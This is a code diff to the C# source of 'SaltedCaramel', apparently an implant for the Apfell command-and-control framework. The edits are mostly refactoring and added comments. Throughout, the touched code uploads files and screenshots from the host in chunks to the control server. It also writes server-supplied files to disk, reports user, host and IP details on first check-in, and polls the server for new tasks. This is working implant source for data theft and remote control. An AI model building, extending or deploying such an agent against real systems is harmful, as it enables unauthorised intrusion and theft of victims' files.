@@ -7,23 +7,20 @@ using System.Threading;
 
 namespace SaltedCaramel
 {
-    internal class CallbackResponse
+    internal struct CallbackResponse
     {
-        public string status { get; set; }
-        public string id { get; set; }
-        // public int integrity { get; set; }
+        public string status;
+        public string id;
     }
 
-    internal class TaskResponse
+    internal struct TaskResponse
     {
-        public string response { get; set; }
-        public string id { get; set; }
+        public string response;
+        public string id;
 
         public TaskResponse(string response, string id)
         {
-            this.response = System.Convert.ToBase64String(
-                Encoding.UTF8.GetBytes(response)
-            );
+            this.response = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(response));
             this.id = id;
         }
     }
@@ -31,16 +28,16 @@ namespace SaltedCaramel
     /// <summary>
     /// Class for the response we get when downloading a file
     /// </summary>
-    internal class DownloadResponse
+    internal struct DownloadResponse
     {
         public string file_id { get; set; }
     }
 
-    internal class FileChunk
+    internal struct FileChunk
     {
-        public int chunk_num { get; set; }
-        public string file_id { get; set; }
-        public string chunk_data { get; set; }
+        public int chunk_num;
+        public string file_id;
+        public string chunk_data;
     }
 
     /// <summary>
@@ -71,7 +68,7 @@ namespace SaltedCaramel
         public string PostResponse(TaskResponse taskresp)
         {
             string endpoint = this.endpoint + "responses/" + taskresp.id;
-            try
+            try // Try block for HTTP requests
             {
                 // Encrypt json to send to server
                 string json = JsonConvert.SerializeObject(taskresp);
@@ -94,7 +91,7 @@ namespace SaltedCaramel
                     throw (new Exception("[!] PostResponse - ERROR: Retries exceeded"));
                 }
             }
-            catch (Exception e)
+            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
             {
                 return e.Message;
             }
@@ -122,7 +119,7 @@ namespace SaltedCaramel
         /// <param name="filepath">The file path to download</param>
         public void SendFile(string taskId, string filepath)
         {
-            try
+            try // Try block for file upload task
             {
                 // Get file info to determine file size
                 FileInfo fileInfo = new FileInfo(filepath);
@@ -137,6 +134,7 @@ namespace SaltedCaramel
                 Debug.WriteLine($"[+] SendFile - File size = {size} ({total_chunks} chunks)");
 
                 // Send number of chunks associated with task to Apfell server
+                // Response will have the file ID to send file with
                 TaskResponse initial = new TaskResponse("{\"total_chunks\": " + total_chunks + ", \"task\": \"" + taskId + "\"}", taskId);
                 DownloadResponse reply = JsonConvert.DeserializeObject<DownloadResponse>(PostResponse(initial));
                 Debug.WriteLine($"[-] SendFile - Received reply, file ID: " + reply.file_id);
@@ -147,7 +145,6 @@ namespace SaltedCaramel
                 {
                     byte[] chunk = null;
                     long pos = i * 512000;
-
 
                     // We need to use a FileStream in case our file size in bytes is larger than an Int32
                     // With a filestream, we can specify a position as a long, and then use Read() normally
@@ -189,7 +186,7 @@ namespace SaltedCaramel
                 this.SendComplete(taskId);
                 Debug.WriteLine($"[+] SendFile - File transfer complete: {filepath}");
             }
-            catch (Exception e)
+            catch (Exception e) // Catch any exception from file upload
             {
                 // Something failed, so we need to tell the server about it
                 this.SendError(taskId, e.Message);
@@ -199,7 +196,7 @@ namespace SaltedCaramel
 
         public void SendScreenshot(string taskId, byte[] screenshot)
         {
-            try
+            try // Try block for HTTP request
             {
                 TaskResponse initial = new TaskResponse("{\"total_chunks\": " + 1 + ", \"task\":\"" + taskId + "\"}", taskId);
                 DownloadResponse reply = JsonConvert.DeserializeObject<DownloadResponse>(PostResponse(initial));
@@ -219,7 +216,7 @@ namespace SaltedCaramel
                 // Tell the Apfell server file transfer is done
                 this.SendComplete(taskId);
             }
-            catch (Exception e)
+            catch (Exception e) // Catch exceptions from HTTP requests
             {
                 // Something failed, so we need to tell the server about it
                 this.SendError(taskId, e.Message);
@@ -233,10 +230,10 @@ namespace SaltedCaramel
         /// <param name="file_id">The file ID to download.</param>
         /// <param name="filepath">The path to drop the file on disk.</param>
         /// <param name="taskId">The task ID associated with this task.</param>
-        public void GetFile(string file_id, string filepath, string taskId)
+        internal void GetFile(string file_id, string filepath, string taskId)
         {
             string fileEndpoint = this.endpoint + "files/callback/" + this.callbackId;
-            try
+            try // Try block for HTTP request
             {
                 string json = "{\"file_id\": \"" + file_id + "\"}";
                 // Encrypt json to send to server
@@ -244,21 +241,21 @@ namespace SaltedCaramel
 
                 string result = crypto.Decrypt(HTTP.Post(fileEndpoint, encrypted));
                 byte[] output = Convert.FromBase64String(result);
-                try
+                try // Try block for writing file to disk
                 {
                     // Write file to disk
                     File.WriteAllBytes(filepath, output);
                     this.SendComplete(taskId);
                     Debug.WriteLine("[+] GetFile - File written: " + filepath);
                 }
-                catch (Exception e)
+                catch (Exception e) // Catch exceptions from file write
                 {
                     // Something failed, so we need to tell the server about it
                     this.SendError(taskId, e.Message);
                     Debug.WriteLine("[!] GetFile - ERROR: " + e.Message);
                 }
             }
-            catch (Exception e)
+            catch (Exception e) // Catch exceptions from HTTP request
             {
                 // Something failed, so we need to tell the server about it
                 this.SendError(taskId, e.Message);
@@ -268,7 +265,7 @@ namespace SaltedCaramel
 
         /// <summary>
         /// Send initial implant callback, different from normal task response
-        /// because we need the implant ID
+        /// because we need to get the implant ID from Apfell server
         /// </summary>
         public void InitializeImplant()
         {
@@ -276,7 +273,7 @@ namespace SaltedCaramel
             this.retry = 0;
 
             crypto.PSK = this.PSK;
-            try
+            try // Try block for HTTP request
             {
                 // Get JSON string for implant
                 // Format: {"user":"username", "host":"hostname", "pid":<pid>, "ip":<ip>, "uuid":<uuid>}
@@ -312,7 +309,7 @@ namespace SaltedCaramel
                     throw (new Exception("[!] InitializeImplant - ERROR: Retries exceeded when initializing implant"));
                 }
             }
-            catch (Exception e)
+            catch (Exception e) // Catch exceptions from HTTP request
             {
                 Debug.WriteLine(e.Message);
             }
@@ -325,11 +322,11 @@ namespace SaltedCaramel
         public SaltedCaramelTask CheckTasking()
         {
             string taskEndpoint = this.endpoint + "tasks/callback/" + this.callbackId + "/nextTask";
-            try
+            try // Try block for checking tasks (throws if retries exceeded)
             {
                 while (retry < 20)
                 {
-                    try
+                    try // Try block for HTTP request
                     {
                         SaltedCaramelTask task = JsonConvert.DeserializeObject<SaltedCaramelTask>(crypto.Decrypt(HTTP.Get(taskEndpoint)));
                         retry = 0;
@@ -337,7 +334,7 @@ namespace SaltedCaramel
                             Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
                         return task;
                     }
-                    catch (Exception e)
+                    catch (Exception e) // Catch exceptions from HTTP request
                     {
                         retry++;
                         Debug.WriteLine("[!] CheckTasking - ERROR: " + e.Message + ", retrying...");
@@ -347,7 +344,7 @@ namespace SaltedCaramel
                 }
                 throw new Exception();
             }
-            catch
+            catch // Catch exception when retries exceeded
             {
                 Debug.WriteLine("[!] CheckTasking - ERROR: retries exceeded.");
                 return null;
